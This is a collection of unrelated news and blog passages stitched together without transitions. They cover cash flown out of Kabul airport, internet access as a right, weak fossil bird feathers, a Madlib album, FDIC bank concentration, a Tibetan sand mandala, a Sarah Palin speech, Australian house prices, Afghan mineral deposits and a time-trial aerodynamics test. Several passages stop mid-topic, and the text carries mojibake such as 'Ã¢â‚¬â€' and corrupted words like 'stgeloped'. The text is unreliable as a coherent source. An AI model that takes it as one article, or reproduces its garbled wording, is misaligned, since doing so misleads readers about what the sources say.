Officials believe some of the cash , if not most , is siphoned from Western aid projects and U.S. , European and NATO contracts to provide security , supplies and reconstruction work for coalition forces in Afghanistan .
The North Atlantic Treaty Organization spent about $ 14 billion here last year alone .
Profits reaped from the opium trade are also a part of the money flow , as is cash earned by the Taliban from drugs and extortion , officials say .
The amount declared as it leaves the airport is vast in a nation where the gross domestic product last year totaled $ 13.5 billion .
More declared cash flies out of Kabul each year than the Afghan government collects in tax and customs revenue nationwide .
" It 's not like they grow money on trees here , " said a U.S. official investigating corruption and Taliban financing .
" A lot of this looks like our tax dollars being stolen .
And opium , of course . "
Most of the funds passing through the airport are being moved by often - secretive outfits called " hawalas , " private money transfer businesses with roots in the Muslim world stretching back centuries , officials say .
Internet use has become so woven into everyday life that some technology experts say online access should be legally protected , even to the point of considering it a human right .
'' It 's a social inclusion question , '' said Cyberspace Law and Policy Centre executive director David Vaile , who is alarmed film and music companies have sought to require internet service providers to disconnect individual accounts over unproven piracy allegations .
Mr Vaile said removing online access would potentially disenfranchise people from society .
Australian copyright provisions allowing '' fair use ' ' were substantially less forgiving than US laws and threatened consumers here with losing their online access .
'' The number of people who could be chucked off like this is quite huge , '' Mr Vaile said .
Almost two - thirds of Australian homes - more than 5 million households - now have broadband access , according to the Australian Bureau of Statistics .
The federal government wants to expand this access via the planned $ 43 billion national broadband network , which aims to connect 90 per cent of Australian homes to a high - speed network of 100 megabits per second .
The rest would be connected using wireless and satellite technologies .
The call to safeguard online access is not without precedent .
In France and Greece , consumers have a legal right to internet access .
In Finland and Estonia , it has been enshrined as a human right .
Earlier this year , the BBC commissioned a GlobeScan survey of more than 27,000 people in 26 countries that found 79 per cent of adults regarded online access as a fundamental right .
Internet community activist Brett Solomon , the former head of GetUp ! and now executive director of AccessNow.org in the US , backed Mr Vaile 's call to safeguard online access .
'' Access to the internet is both a gateway to other rights and a right unto itself , '' Mr Solomon said , describing it as '' essential to the enjoyment of one 's basic human rights ' ' .
He said online access was central to freedom of expression .
'' Without access ... citizens cannot fully participate in modern democracy , '' he said .
Australian Human Rights Commission president Catherine Branson , QC , said the commission had not yet looked at internet access as a human right .
But it did recognise internet access may raise issues '' relevant to the right to freedom of expression ' ' as defined in a United Nations covenant on civil and political rights .
The wings were willing , but the feathers were weak .
Delicate , thin - shafted plumage would have made flapping difficult if not impossible for two prehistoric birds , a new analysis of fossil feathers suggests .
Their feathers probably would have buckled or snapped during strong flapping or sharp maneuvers , so the primitive birds may have been limited to gliding , says Robert Nudds , an evolutionary biologist at the University of Manchester in England .
He and paleontologist Gareth Dyke of University College Dublin report an engineering analysis of feathers from the ancient birds Archaeopteryx and Confuciusornis in the May 14 Science .
Nudds and Dyke used a simple formula often applied to bridges and beams to estimate the load - carrying capacities of the birds ' feathers , based on fossil remains .
The team also looked at the feathers of four modern birds with a variety of feather and flight types – a pigeon , a gull , an albatross and a vulture .
Even though the feathers of Archaeopteryx and Confuciusornis were about the same size as those of a modern - day pigeon , they had smaller diameter shafts that rendered them much weaker .
" Even if these feathers had solid shafts , they 're not very impressive , " says Lawrence Witmer , a paleontologist at Ohio University in Athens who was not part of the new study .
" They 're so flimsy that they could n't have supported much weight . "
In straight and level flight , the lift generated by a bird 's wings , tail and other flight surfaces must support the bird 's weight .
But during extreme maneuvers such as high - speed turns – analogous to a fighter pilot " pulling g's " – the forces on a bird 's feathers are much higher , Nudds says .
In those cases , birds rely on their bones and feathers having a " margin of safety " that makes them several times stronger than needed for straight and level flight .
In modern birds , feathers typically fail when forces acting perpendicular to the central shaft cause that load - bearing structure to buckle , Nudds says .
To prevent this , lift - generating feathers in present - day birds are many times stronger than necessary for level flight , from a factor of around six in vultures to a factor of more than 13 in gulls .
But in the ancient birds , margins were much smaller : 2.9 for Confuciusornis and four for Archaeopteryx .
If these birds had feathers with partially hollow shafts similar to those of modern feathers , these margins could have been even lower , the team argues .
The ancient birds may have simply glided from one branch to another , the researchers say , or " parachuted " from high spots to low by splaying their wings and slowing their descent .
Other recent studies of Archaeopteryx – a fossil iconic of the transition from dinosaurs to birds – have also cast doubt on the creature 's flying ability .
Research suggests , for example , that although Archaeopteryx had large enough feathers for flight , it did n't have the right bone structure to take the large upstroke required for efficiently powered flight , says Richard Prum , an ornithologist at Yale University .
" Not only is the shoulder joint oriented wrong for powered flight in Archaeopteryx and Confuciusornis , but the new study shows that even the feathers are n't built right for it , " says Phil Senter , a paleontologist at Fayetteville State University in North Carolina .
" I 've thought for some time that the feathers of nonavian dinosaurs and [ primitive ] birds were primarily display structures , and the lack of powered flying ability is consistent with that idea , " he notes .
As far as Archaeopteryx is concerned , Witmer concurs , to a degree .
In recent studies , Archaeopteryx " has become less birdlike … and is starting to look like just another feathered predatory dinosaur . "
He notes , though , that at this point the features of Archaeopteryx still seem closer to birds than to other dinosaurs .
The lack of modern flying ability should n’t cast poor light on Archaeopteryx , Witmer adds .
" A lot of ancient birds were probably pretty clumsy . "
The ability to glide or parachute from one branch to another was still an advantage , he suggests : " Anything that slows an organism 's descent would add to its survivability . "
It 's possible , Witmer notes , that some aspects of the primitive feathers yet to be recognized by scientists compensated for their structural weakness .

For bedroom beat - makers and home - studio engineers today , music software , digital boards and CD burners are second nature .
But in the not - so - distant past , recording music was a little bit more of an ordeal , where a demo tape either meant booking studio time weeks in advance or shelling out a lot of money to Tascam , Maxell & TDK .
Most of the music on Madlib Medicine Show # 5 : The History of the Loop Digga , was created from beats stored on floppy disc , created on SP - 1200 , and recorded & mixed on a Tascam 8 - track , 1/4 - inch reel - to - reel , or Tascam 8 - track cassette deck .
( Even the debut Quasimoto album was recorded on 8 - track cassette . )

The FDIC has a big problem on its hand .
Some would say it is a too big to fail problem .
The Federal Deposit Insurance Corporation looks over 8,000 + banks and protects the deposits at these banks .
Yet this seemingly large number is merely a front for where the assets are congregated .
The top 4 banks of Bank of America , JP Morgan Chase , Wells Fargo , and Citibank make up 55 percent of all banking assets .
This number is absolutely large .
FDIC backed institutions have $ 13 trillion in total assets .
Even yesterday as Wall Street demonstrated the dangers of concentrated power in a few big investment banks , rumors were flying around that some of the bigger banks made sizeable gains in their trading portfolios .
This brings up many questions for average Americans who are under the impression that their bank is actually keeping their money safe and sound instead of placing major bets on the stock market .
Yet the major bets will continue because during the news heavy day , what was n’t reported through the mainstream media was how the too big to fail amendment failed in the Senate .
Just take a look at the assets of the too big to fail :
Source : FDIC , Bank Financial Statements
The above must be changed yet Congress is n’t willing to move .
What this means is that we will see more and more local regional bank failures as the commercial real estate bust continues to hit the economy .
Yet people still need banking services and this provides an easy way for the bigger banks to actually get bigger .
Think this is n’t the case ?
“ J.P. Morgan Chase said Wednesday that it will open 90 branches in California this year , adding 1,200 jobs and bringing its statewide network to 800 branches and 3,000 ATMs .
Chase ( NYSE : JPM ) said 35 of those branches will be in Northern California , 18 opening in the Bay Area .
“ California is an important and growing market for Chase and we will continually invest in the people , facilities and technology needed to serve California consumers and businesses well , ” said Pablo Sanchez , who manages Chase ’s branch network in the western United States . ”
So as the FDIC is busy on Fridays with closing banks , we have JP Morgan Chase opening up more banks in California .
Even if the too big to fail banks are gouging Americans with credit card terms , restricting access to credit , and consolidating their power they are making large amounts of money through their investment banking units .
We have already learned through the experience of this market that the government is unwilling or unable to shut down the bigger banks .
As we have noted above , they are even getting bigger .
At the same time , the list of troubled institutions grows :
The FDIC has its hands full because we will have at least 1,000 bank failures ex -the too big to fail banks when this crisis is said and done .
Even the troubled institutions of smaller banks have large amounts of assets :
At currently troubled banks labeled by the FDIC $ 402 billion is under their management .
And as we saw last week with over $ 7 billion in costs for 7 failed banks , the FDIC fund is getting extremely close to requiring a government bailout .
When everything is subject to a bailout , you take the infectious problems of the banks and toxic loans and transfer the risk to the entity doing the bailing out .
That is why the U.S. markets are having such a volatile reaction to what is currently going on .
If you think bringing on large amounts of debt is good for the country just look at Greece .
Having too much debt is not a way forward in achieving prosperity .
As people in the middle class try to get by in this Great Recession , these banks that are essentially protected by the government through trillions in bailouts are also the largest players in the credit card markets :
So while bankruptcies are soaring for Americans , these banks have the ultimate get out of jail free card .
For the average working class American they are being gouged by onerous fees and high rates all the while taxpayers are giving banks easy access to cheap money so they can go off and gamble in the stock market .
Massive market volatility is not a sign of a healthy market .
In fact , many of the biggest historical jumps and falls occurred during the Great Depression .
The 1,000 intraday drop on the Dow was the largest on record .
Yet we have to ask , the FDIC has been a sign of stability for most Americans when they see the label on the bank door .
Yet how can we feel confident when $ 13 trillion in assets are under control from the 8,000 banks and yet the actual insurance fund only has a few billion dollars ( a number that is quickly approaching zero even after years of advanced premiums paid by member banks ) ?
This number can be wiped out with two big Fridays .
In reality , even one too big to fail bank would wipe out the FDIC completely .
This has never been an issue of liquidity ; this is an issue of solvency .
The core of the problem is that many banks have too much debt that is n’t valued at what banks would like it to be valued at .
The FDIC conducted a recent survey and found that many U.S. households are underbanked :
“ A substantial percentage of lower - income households are unbanked .
Nearly 20 percent of lower income U.S. households — almost 7 million households earning below $ 30,000 per year — do not currently have a bank account .
Households with earnings below $ 30,000 account for at least 71 percent of unbanked households .
Not having enough money to feel they need an account is the most common reason why unbanked households are not participating in the mainstream financial system . ”
I ’m not sure if this is even a surprise .
I would also suspect that many people now just do n’t trust the banking industry .
The FDIC is going to be busy for a few years because the reality is , there are trillions in toxic assets that are overvalued on the balance sheet of banks .
Commercial real estate will bring down many banks in the current year .
Until we have serious change in the system , expect these kinds of massive raids on the market to continue while middle class Americans are caught in the battle .

Update , June 7 : Many of you wrote wanting to know more about the music used in the time - lapse video .
The song is called " Detectors in the Eyes " and it's by Andrew Shapiro .
It took six days for a group of Buddhist monks to create an extravagant sand mandala at Emory University in Atlanta , Georgia .
But you can watch the entire process in about two minutes thanks to the time - lapse video above .
The sacred art was created March 22 - 27 as part of Emory ’s annual “ Tibet Week ” celebration .
The monks were from Drepung Loseling Monastery Inc. , a nonprofit organization in Atlanta dedicated to the study and preservation of Tibetan Buddhist traditions .
Sand mandalas have been in practice for thousands of years , according to Tsepak Rigzin , assistant program director for Drepung Loseling and an adjunct Tibetan language instructor at Emory .
Monks use a grated metal rod and a traditional metal funnel called a chak - pur to carefully place millions of grains of colored sand on a table .
“ It has to be very exact and very precise , ” Rigzin said .
There are hundreds of colorful mandala designs to choose from , Rigzin said , but they all share a basic format of geometric shapes and spiritual symbols .
“ Normally the monks who do this , they have to go through a lot of training programs and they have to be authenticated by their masters , ” Rigzin said .
“ They have to memorize the oral texts and learn the ritual . ”
The ritual starts with the monks blessing the site of the soon - to - be mandala .
They then take several hours to draw an outline of the particular mandala they are about to build – in Emory ’s case , the mandala of Avalokiteshvara , or the Buddha of compassion .
Once the outline is in place , the tedious work of laying the sand begins .
“ I was really awestruck by their level of concentration , ” said Mark Hill , the CNN photographer who captured the time - lapse footage at Emory 's Michael C. Carlos Museum .
“ People were in there talking and walking around them , taking pictures .
There was a lot going on in the room .
But those monks who were building that mandala were absolutely laser - focused on what they were doing . ”
Hill set up two cameras in the room .
One was an overhead camera that did n’t move during the six days ; the other was moved every morning to get a different angle .
Both ran continuously , shooting one frame every 30 seconds .
When the last grain of sand was set , the monks did n’t spend time admiring their handiwork .
Within about an hour , the elaborate art they had spent days crafting was carefully swept away during a ritualistic ceremony .
This is normal practice , Rigzin said ; it is done to symbolize the impermanence of life .
The monks passed out half of the sand to the audience as blessings for health and healing .
The rest was poured into a nearby river , Rigzin said , as a gift to Mother Earth .
Emory will be having another “ Tibet Week ” of sorts when the Dalai Lama visits the campus October 17 - 19 .
The exiled leader of Tibetan Buddhists has visited the school several times in the past two decades , and he was the commencement speaker there in 1998 .
That year , His Holiness also helped form the Emory - Tibet Partnership , which includes various exchange programs between Emory and Tibetan institutions of higher learning .
Former Alaska Governor Sarah Palin has been called “ no friend to animals ” by many animal rights activists , mainly for her unyielding support for hunters , but she certainly likes to use animal metaphors .
“ Palin on Friday told an anti-abortion rights group that women will lead a Republican wave and stop the Democratic agenda .
She also criticized President Barack Obama ’s health care overhaul , ” the Associated Press reports .

The AP article adds , “ Palin said female activists Ã¢â‚¬â€ ‘ mama grizzlies , ’ she calls them Ã¢â‚¬â€ will help the party ‘ take this country back . ’
Palin decried Democrats ’ position on abortion rights and said Obama is ‘ the most pro-abortion president ever to occupy the White House . ' ”
But the AP points out , “ In fact , Obama ’s health care law would not allow federal dollars to pay for elective abortions .
Catholic hospitals and organizations of Catholic nuns backed the measure .
U.S. Catholic bishops and major anti-abortion groups opposed it . ”
A story at the Washington Post notes that the unsuccessful 2008 candidate for Vice President spoke at a “ breakfast gathering Friday of the Susan B. Anthony List in downtown Washington , … urging more than 500 audience members to back only those candidates for public office who are uncompromisingly opposed to abortion . ”
“ Being a pro-life politician is more than just a convenient title , come election time , ” Palin said .
“ It means making tough decisions even if it means bucking your party . ” ….
“ The mama grizzlies , they rise up , ” she said , to laughter .
“ You thought pit bulls are tough .
You do n’t want to mess with the mama grizzlies .
And I think there are a whole lot of those in this room . ” ….
Palin also told of her teenage daughter Bristol ’s decision , after becoming pregnant , to keep her baby .
And Palin criticized abortion - rights advocates for delivering the message to young mothers that they do n’t have the strength to go through with pregnancy and motherhood .
“ Our prominent woman sisterhood is telling these young women that they are strong enough to deal with this , ” Palin said .
“ They can give their child life , in addition to pursuing career and education and avocations .
Society wants to tell these young women otherwise .
These feminist groups want to tell these women that , ‘ No , you ’re not capable of doing both . ’ . . .
It ’s very hypocritical . ”
Unlike the Associated Press article , which — at press time was just a breaking story with a few paragraphs — the Washington Post article does n’t offer any balance or counter anything Palin said at the event Friday .

Another report by 13 News adds ,
Governor Palin also told supporters what her family experienced since her selection as John McCain ’s running mate , has strengthened my unwavering support for life .
After finding out her fifth child would be born with Downs Syndrome , while she herself never contemplated abortion , she empathized with women who might be tempted with that choice .
She believes choosing life in that situation may not be the easiest path but its always the right path .

If the saying is true , what makes a market is that you have a buyer and a seller , who have a difference of opinion .
Well , that ’s certainly the case in the residential property market .
Residential real estate is almost the sacred cow of Australian investment .
Over the last 80 years the trend rate of growth in real house prices has been about 3 per cent a year – consistent with long - term real GDP growth .
Lately , that growth rate has been even higher .
According to real estate advisory business Rismark , between December 2004 and December 2009 Australian house prices , Australian house prices grew by 6.2 per cent real a year .
The RP Data - Rismark Hedonic
Index for national city dwelling values rose another 1.4 per cent in February , making the annual gain for the 12 months 12.7 per cent .
Melbourne rose 2 per cent on the month , to be up 19 per cent on the year ; while Sydney jumped 2.6 per cent to be up 12 per cent for the year .
Steve Keen , associate professor of economics and finance at the University of Western Sydney , says growth rates such as these cannot last .
Keen says that Australian house prices are overvalued , and will fall by 40 per cent over the next ten to fifteen years .
Christopher Joye , chief executive of Rismark , scoffs at this view .
He says prices will continue to rise – although he does not discount the possibility of volatility – for the simple reason that housing is an under - supplied commodity in Australia .
It ’s worth pointing out here that , contrary to a prevailing belief in many Australian investors , there is nothing intrinsically magical about residential real estate that makes it always rise in price .
If it is over - supplied , it will fall – as in the USA at present .
But that is not the case in Australia .
According to the Housing Industry Association ( HIA ) , Australia presently builds 109,000 fewer dwellings a year than it needs .
On present population projections , HIA economist Ben Phillips says that shortfall will reach 466,000 dwellings by 2020 .
Joye says the shortfall is being magnified by Australian ’s booming population .
“ Australia has got the strongest population growth in the stgeloped world .
It ’s currently running at 2.1 per cent a year .
We have 22 million people presently , it ’s forecast to go to 36 million people by 2050 , we think that ’s actually more likely to be 40 million people . ”
The widening gap between demand and supply “ categorically ” stands as an underpinning factor for house prices , says Joye .
“ The fact of the matter is that asset prices are determined by supply and demand .
To have a view on asset prices – on house prices – you have to have a view on demand and supply , because that ’s the way that prices are formed .
“ This is a market , and the way that markets work is that the price signal communicates to the economy as to where it should allocate its scarce capital .
The house price signal is rising , which is effectively saying to builders and stgelopers is ‘ you should be investing in new housing ’ – because we have a housing shortage . ”
The only way that more supply will come online is if the investment case for housing is a “ solid and credible case , ” says Joye .
“ Rising prices are a clear signal to the market from the supply side that there are reasonable economic returns to be earned from investing in new housing – and that ’s a very positive thing for the market . ”
Keen disputes the supply / demand argument .
“ The way to analyse that is to ask : how many people per house do we normally have , what is the flow of new people turning up in the country and what ’s the flow of new houses being built .
When you do that comparison , you find that the average occupancy is 1.9 people per house , we therefore needed to build one house roughly per two new people arriving in the country – whether they ’re born or immigrants .
But until 2005 , we were building about one house per 1.5 people .
“ So until then , the flow of demand versus the flow of supply was such that we should have seen a falling occupancy rate : that means an excess supply .
If demand / supply is what causes everything , we should have seen falling prices for the previous 25 years , and they should have just turned around in the last three years .
So the argument is spurious . ”
Keen ’s explanation for the house price growth since the 1990s is mostly leverage – that people have progressively been allowed to borrow more , and government policy in the form of assistance to first home buyers .
“ What has really driven house prices is leverage : that ’s the most significant factor .
If you go back to the 1960s , the highest loan - to - value ratio ( LVR ) you would have got from a bank would be 70 per cent .
But before the global financial crisis ( GFC ) hit , Australian borrowers were offered up to 95 per cent LVRs .
That means that somebody with $ 50,000 can bid $ 1 million on a house .
“ Banks have started to wind those LVRs back .
Firstly , they went to a 92 per cent LVR : to make a bid on that $ 1 million house , you needed an $ 80,000 deposit .
Now some of the banks will only give you an 87 per cent LVR : now , you would need a $ 130,000 to make that bid . ”
Keen says that even though the RBA ’s rate cuts have reduced the cost substantially from its peak , interest payments on mortgages in Australia today consume 7.5 per cent of household disposable income – or 1.65 times the average from 1976 to now .
“ The primary driver behind this extreme rise in debt servicing costs is the ratio of mortgage debt to income .
This is more than five times larger today than it was in 1990 – 130 per cent of household disposable income versus 25 per cent in 1990 .
This growth was exacerbated by the First Home Owners ’ Grant ( FHOG ) , he says .
“ About 250,000 people took out the Rudd grant .
Because it was $ 7000 , which was increased to $ 14,000 and there were all the state amounts were there as well , that 250,000 people put about $ 2.5 billion of government money into the housing market .
“ But then , people would go and lever that , borrow more money , and the people who sold the house who were upgrading would do the same again .
You had leverage cascading upwards , and the end result was equivalent to about $ 100 billion of borrowed money that would not have been borrowed otherwise .
Quite simply , the grant triggered a bubble , and that has to come out of house prices , ” says Keen .
But Joye says house prices have simply tracked incomes for the last five years .
“ Between December 2004 and December 2009 , Australian house prices – all areas dwelling prices – grew by 6.2 per cent a year , whereas disposable incomes grew by 6.0 per cent a year .
“ But we actually strip out the 40 per cent of homes that are not in capital cities : they grew by 5.1 per cent a year .
So on that basis , 40 per cent of the market has actually under - performed income , whereas 60 per cent of the market has tracked incomes .
Disposable incomes is what mortgages are paid from , so we dispute that house prices have got away from people ’s ability to service the debt . ”
Joye argues that Australia has currently among the lowest mortgage default rates in the world .
“ On Reserve Bank of Australia statistics , the current 90 - day default rate is 0.6 per cent .
That is less than one - tenth of the US default rate , which is 8 per cent .
But our mortgage rates are much higher than almost other stgeloped economies around the world .
That tells you a simple story : that the ability of Australian households to service that housing debt is extremely strong . ”
Joye also disputes the contention that the FHOG caused a housing bubble .
“ That is simply not true .
The strongest - performing market over the last 12 months has been the top 20 per cent of suburbs , ranked by price .
In other words , the most expensive suburbs in Australia have significantly outperformed the cheaper suburbs .
That does n’t reconcile well with the purported FHOG being the reason for price growth in 2009 . ”
The volume of mortgage lending is also an important indicator of the health of the market .
Here , the most recent statistics show that new home loans fell for the seventh time in eight months in February , down by 1.8 per cent to the lowest level in 16 months .
The proportion of first - home buyers hit a 20 - month low .
“ If there ever was an emerging housing bubble – and there was n’t – it has been successfully deflated , ” says Craig James , chief economist at CommSec .
“ Home lending has fallen in seven of the past eight months and further weakness may lie ahead in response to rate hikes in March and April .
It is not just first - home buyers in retreat .
“ The number of second and subsequent home buyers in February was the lowest for any February month in nine years .
It ’s clear that both higher interest rates and higher home prices are causing more budding home buyers to cool their heels on the sidelines , ” says James .
And then there is affordability : that shifting combination of house prices , interest rates and incomes .
House prices rise , as they did in 2009 , when affordability improves .
Here , the most important factor at present is interest rates – particularly in light of the five interest rate rises in the current cycle , from 3 per cent to 4.25 per cent .
According to the Fujitsu Mortgage Stress - O- Meter report for March , interest rate rises and cost of living increases pushed up the number of severely stressed households by 1.6 per cent to 222,225 in March , from 218,765 in February .
And Fujitsu executive director Martin North says it is the newer entrants to the market that are coming under more pressure
“ We estimate that by December 2010 , 469,000 households will be in some degree of discomfort and those in severe stress perhaps as high as 267,000 , ” says North .
“ The consequence of this is that stress is becoming more isolated to specific household segments , with first time buyers with young growing families feeling the pain most strongly . ”
However , the rise in severe mortgage stress comes as the total number of households under mortgage stress eased by 3.5 per cent in March to 561,000 from 581,000 in February , on improving job prospects .
This means that the resources boom will also play its part in the health of the Australian housing market .
One thing is for certain , it is not a straightforward market – as the marked differences of opinion on it tell you .

A New York Times report announcing the US has found $ 1 trillion - worth of mineral deposits in Afghanistan has some observers wondering if the news is part of a public - relations effort to bolster support for the Afghanistan war as the mission ’s death toll continues to climb .
An article in Sunday ’s New York Times announces that “ previously unknown deposits Ã¢â‚¬â€ including huge veins of iron , copper , cobalt , gold and critical industrial metals like lithium Ã¢â‚¬â€ are so big and include so many minerals that are essential to modern industry that Afghanistan could eventually be transformed into one of the most important mining centers in the world , the United States officials believe . ”
ADVERTISEMENT
The article cites an “ internal Pentagon memo ” as saying Afghanistan could become the “ Saudi Arabia of lithium ” — the mineral used in the production of rechargeable batteries , such as those found in cell phones and laptops .
It cites “ a small team of Pentagon officials and American geologists ” as having made the discovery .
While the dollar estimate — $ 1 trillion — may be new , it ’s hardly news that Afghanistan sits on rich mineral deposits .
In a 2007 press release , the US Geological Survey announced that Afghanistan possesses “ significant amounts of undiscovered non-fuel mineral resources . ”
And , as Marc Ambinder reports on his Atlantic blog , the Soviet Union was aware of Afghanistan ’s mineral potential as early as 1985 .
Ã¢â‚ ¬Å“ The Ã¢â‚ ¬ËœdiscoveryÃ¢â‚¬â„ ¢ of AfghanistanÃ¢â‚¬â „ ¢s minerals will sound pretty silly to old timers , Ã¢â‚ ¬Â a “ retired former senior US official ” tells Politico ’s Laura Rosen .
Ã¢â‚ ¬Å“ When I was living in Kabul in the early 1970 Ã¢â‚¬â „ ¢s the [ US government ] , the Russians , the World Bank , the UN and others were all highly focused on the wide range of Afghan mineral deposits .
Cheap ways of moving the ore to ocean ports has always been the limiting factor .
Ã¢â‚¬Â
So why is this news now ?
To many , the story ’s timing suggests a Pentagon public relations campaign designed to extend public support for the war with the hope that , in time , Afghanistan may be able to raise itself out of abject poverty .
“ Why the story broke in the NYT on Sunday could be linked to a desire by the Pentagon to create a reason why US troops might want to stick around in Afghanistan for some time to come , ” writes Paul Jay at the Huffington Post .
“ Things are not going very well on the ground and the promise of vast mineral riches would sound enticing . ”
ADVERTISEMENT
Some “ veteran Afghan hands detect an echo of [ Gen. David ] PetraeusÃ¢â‚¬â „ ¢ effort to ‘ put a little more time on the Washington clock ’ for the Afghanistan surge , as he once described his public relations strategy to buy time in the US for the Iraq surge , ” Rosen reports .
Indeed , the US military ’s need to shore up support for the war effort may be becoming critical .
Recent news reports indicate that Afghan President Hamid Karzai may have lost his faith in the US military ’s ability to carry out the war .
And Gareth Porter at IPS reports that US forces are facing “ the spectre of a collapse of U.S. political support for the war in Afghanistan in coming months comparable to the one that occurred in the Iraq War in late 2006 . ”
That context leads blogger Steve Hynd to declare that the Times piece is “ a conveniently timed zombie story ” that was “ resurrected yet again for political purposes . ”
ADVERTISEMENT
Even if one were to take the Times story at face value , the practical benefits of Afghanistan ’s mineral deposits are in doubt — not least because of the country ’s weak central government , corruption and a lack of skilled labor .
“ Under even the rosiest scenarios , it does not appear the new wealth will change dynamics quickly enough in Afghanistan to aid the US military effort there , ” reports Alan Greenblatt at NPR .

[ Daniel ] Markey [ of the Council on Foreign Relations ] says he ’s nervous that Afghanistan will fall prey to the “ resource curse , ” under which nations that base their economies primarily on natural resources fall prey to conflict and corruption Ã¢â‚¬â€ forces that are already endemic in Afghanistan .
“ Afghanistan can make a lot of money from this , but this is the way to make money that attracts corruption , ” says S. Frederick Starr , chairman of the Central Asia - Caucasus Institute at Johns Hopkins University .
“ A scramble for Afghanistan ’s resources would simply intensify the tribal warfare that ’s already taking place in that devastated country , ” writes Jacob Heilbrun at the Huffington Post .
“ The sad truth is that precious natural resources are , more often than not , a curse for the Third World nations that harbor them . ”

You want to get faster against the clock .
You want to know if you spend X you will get Y time savings in return .
Problem is , you ’re bamboozled by a plethora of marketing hype and scientific data put out by companies who want you to buy their stuff , whether it be snazzy equipment or even time in a wind tunnel .
Where do you start ?
Advertisement
Let ’s break it down into a simple question :
How much time can you save by going from your normal road bike and helmet to adding clip - on handlebar extensions to a full - on time trial bike with an aero helmet ?
That ’s it .
All other equipment ( wheels , tyres , clothing ) stays the same .
The answer is quantifiable but finding it is another matter .
You need to know what you ’re doing , and most of us do n’t .
Luckily there are people called engineers in the cycling world whose job it is to find the answers to these questions .
We were given the opportunity to spend a day with Specialized ’s young aerodynamicist Mark Cote at the A2 Wind Tunnel and Lowe ’s Motor Speedway in North Carolina .
It ’s NASCAR heartland here , and they put a lot of money into aerodynamic testing facilities .
The A2 Wind Tunnel , the smaller brother to the AeroDYN tunnel , is used to test small vehicles and bicycles .
It ’s one of the cheapest in the US at $ 390 per hour ( compared to $ 800 / hr for the San Diego tunnel ) and the tunnel managers Mike Giraud and Dave Salazar know exactly what they ’re doing when it comes to bikes .
Plus they can compare wind tunnel data to on road data by using the nearby Lowe ’s Motor Speedway , a 2.3 km banked NASCAR oval .
For the test , Mark enlisted the help of Nathan O’Neill , eight time Australian time trial champion who has raced for European and US pro teams for the past eight years .
He ’s coming off a 15 month ban ( expires November 12 , 2008 ) after testing positive for the appetite suppressant Phentermine , which bizarrely is legal out of competition but illegal in competition .
But his experience as a wind tunnel subject , time trialist and of course his availability makes him an ideal test rider .
How it ’s done
Wind tunnel measurement is currently considered the gold standard of bicycle aerodynamic testing .
For best results , you need the rider on the bike to be able to hold their position stable while pedalling .
You can test the bike alone , but it makes more sense to have someone on it , because the overall shape will be completely different .
You also need to test over a range of yaw angles ( wind direction relative to the rider ’s direction ) to account for crosswinds , because aerodynamics are significantly affected by wind direction .
The downside of doing this in a tunnel is that you ca n’t account for handling in a crosswind , because the bike is fixed to a set of rollers .
Testing outdoors is useful because it ’s closer to real world conditions .
That said , it ’s time consuming and you still need to control as many variables as possible .
Even if you have a smooth flat track and precise measuring equipment , like the SRM cranks and mobile weather station that we had , too much wind will give you large errors , even greater than what you are trying to measure .

The 70 watt benchmark
In late July , Cote and his team did a series of tests comparing a standard road bike ( Specialized Tarmac SL2 with HED Bastogne wheels ) to a full time trial bike ( Specialized Transition with HED3 Trispoke wheels and a Specialized TT3 aero helmet ) .
They compared wind tunnel data with track testing at the Lowe ’s Speedway and the Asheville velodrome , which consisted of several 10 mile and 1 km time trials at a constant speed of 40 km / h .
They were lucky to have near ideal conditions for the outdoor tests , which kept the measurement errors down to around two percent of total power .
The corresponding errors in the wind tunnel are under one percent .
From doing this , they found the outdoor testing validated the wind tunnel testing , but did not replicate it .
They also found that outdoors there was a 60 - 70 watt saving at 40 km / h between the normal road bike setup , which required 280 - 290W at this speed , and the full time trial setup ( 220W ) .
That worked out at between 22 - 24 percent in aerodynamic savings .
To put it another way , it was nine seconds per kilometre , 2 ’ 14 per 10 miles ( 16.1 km ) , 5 ’33 per 40 km , and 24 ’ 58 over 180.2 km , the distance of the bike leg in an Ironman triathlon .
Or another way , if you can ride a road bike at 40 km / h and switch to a time trial bike and helmet , you can do over 44 km / h .
In the controlled environment of the wind tunnel , the savings were greater : between 32 - 42 percent , depending on yaw angle .
These are aero savings only .
About 70 percent of total power goes towards aero , so 70 percent of 32 - 42 percent = 22 - 29 percent of total power .
This almost exactly matches the 22 - 24 percent from the track .
Also , the bigger the crosswind , the better off you are on a time trial bike because of the sail affect .
Of course , you ’ve got to be able to keep the thing upright …
Drilling down
So how do we break down that 70 watt saving ?
How much is position , how much is the bike , how much is the helmet and how much is the wheels ?
That was the purpose of this test , although we did n’t actually test different wheel configurations , so we were looking at 60 watts worth of savings .
Mark Cote decided on five protocols :

Tarmac SL2 road bike | S - Works road helmet | drop bars
Jeff Jones/BikeRadar.com
Tarmac SL2 road bike | S - Works road helmet | clip - on aero bars
Jeff Jones/BikeRadar.com
Tarmac SL2 road bike| TT2 helmet | clip - on aero bars

Transition time trial bike | S - Works road helmet | aero bars
Jeff Jones/BikeRadar.com
Transition time trial bike | TT2 helmet | aero bars
For each one , we used the same wheels ( Roval ) and tyres , and Nathan rode in a short sleeved skinsuit with arm warmers and full finger gloves , but no shoe covers .
The mass of the bike + rider was 83kg .
All five setups were tested over two laps ( 4.6 km ) of the Lowe ’s Motor Speedway at as close to 40 km / h as we could get .
The tests were repeated in the wind tunnel later that day .
During each test , Mike Giraud acted as a control , riding his bike around the circuit at 32 km / h , with a wind probe attached to the front of his bike that could measure wind speed and direction .
The probe looked like it could double as a harpoon , but luckily there were no whales on the circuit .
It was a clear , sunny November morning but the conditions were n’t quite ideal at the Speedway .
While we could account for the changes in temperature and humidity , the wind affected things a little .
Speedway data
Setup Estimated Ave CdA ( m ^2 ) Speed ( km/ h ) Power ( W ) Tarmac SL2 | road helmet | drop bars 0.310 40.10 306.6 Tarmac SL2 | road helmet | clip - on aero bars 0.267 40.27 268.6 Tarmac SL2 | TT2 helmet | clip - on aero bars 0.256 40.38 261.0 Transition | road helmet | aero bars 0.265 40.17 262.9 Transition | TT2 helmet | aero bars 0.230 40.05 229.0
[ CdA = Coefficient of drag x frontal area ]
On the plus side , the trends were accurate and there was still that big 77W ( 25 percent ) difference between the road bike and the full TT setup .
And it looked as though position would account for about half of that .
But as for deciding how much the bike was worth relative to the aero helmet , it was tough .
This appeared to be because of an unreliable data point , as the time trial bike plus road helmet should have required about 240W rather than 263W at 40 km / h .
We suspected this was because of an SRM calibration error , rather than the wind on the track , but at the time of publication this was a known unknown .
Wind tunnel testing
Mark was happier once we got into the wind tunnel .
